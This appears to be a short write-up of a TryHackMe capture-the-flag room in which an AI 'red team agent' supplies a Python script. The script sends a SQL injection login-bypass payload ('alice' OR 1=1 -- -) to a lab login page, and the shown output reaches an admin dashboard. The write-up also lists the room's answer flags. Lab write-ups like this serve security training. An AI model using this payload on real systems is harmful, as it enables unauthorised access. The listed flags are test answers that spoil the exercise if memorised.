# AI in Security - old sAInt nick
- on opening the address given inside the attackbox we get in a website called vansolve
- it gave a script and asked to run it
- got the flags subsequently

```
import requests

# Set up the login credentials
username = "alice' OR 1=1 -- -"
password = "test"

# URL to the vulnerable login page
url = "http://10.48.166.114:5000/login.php"

# Set up the payload (the input)
payload = {
    "username": username,
    "password": password
}

# Send a POST request to the login page with our payload
response = requests.post(url, data=payload)

# Print the response content
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)
```
```
root@ip-10-48-159-22:~# python3 script.py
Response Status Code: 200

Response Headers:
  Date: Thu, 18 Dec 2025 13:45:55 GMT
  Server: Apache/2.4.65 (Debian)
  X-Powered-By: PHP/8.1.33
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Vary: Accept-Encoding
  Content-Encoding: gzip
  Content-Length: 540
  Keep-Alive: timeout=5, max=99
  Connection: Keep-Alive
  Content-Type: text/html; charset=UTF-8

Response Body:
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - SQLi Lab</title>
    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">
</head>
<body class="dashboard-body">
    <div class="dashboard-container">
        <div class="welcome-banner">
            <h1>Welcome, admin!</h1>
            <p>You have successfully logged in to the system.</p>
        </div>
        
        
        <div class="alert alert-success alert-dismissible fade show" role="alert">
            <h4 class="alert-heading">Exploit Successful!</h4>
            <hr>
            <p class="mb-0"><code>FLAG: THM{SQLI_EXPLOIT}</code></p>
            <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
        </div>
        
        <a href="logout.php" class="btn btn-danger">Logout</a>
    </div>
    
    <script src="assets/js/bootstrap.bundle.min.js"></script>
</body>
</html>


root@ip-10-48-159-22:~# 

```
<img width="1369" height="915" alt="image" src="https://github.com/user-attachments/assets/4e01718a-933d-4a81-a441-49f3b5540a3d" />

## Complete the AI showcase by progressing through all of the stages. What is the flag presented to you?
```
THM{AI_MANIA}
```
## Execute the exploit provided by the red team agent against the vulnerable web application hosted at 10.48.166.114:5000. What flag is provided in the script's output after it?
``Remember, you will need to update the IP address placeholder in the script with the IP of your vulnerable machine (10.48.166.114:5000)``
```
THM{SQLI_EXPLOIT}
```
